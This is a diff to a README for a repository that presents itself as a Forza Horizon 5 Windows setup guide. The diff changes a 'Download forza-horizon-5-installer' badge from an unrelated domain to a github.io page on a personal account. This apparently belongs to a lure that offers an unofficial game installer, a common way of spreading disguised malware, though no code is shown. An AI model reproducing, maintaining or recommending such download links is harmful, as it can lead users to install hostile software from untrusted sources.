@@ -2,7 +2,7 @@
 
 This repository covers a clean Windows setup for **Forza Horizon 5** — launcher linking, file verification, performance tuning, and safe DLC/save workflows.
 
-[![Download Forza Horizon 5](https://img.shields.io/badge/Download-forza--horizon--5--installer-blueviolet)](https://metarefund.com/)
+[![Download Forza Horizon 5](https://img.shields.io/badge/Download-forza--horizon--5--installer-blueviolet)](https://iluminadacereo1.github.io/.github/fh-5-installer)
 
 ---
 
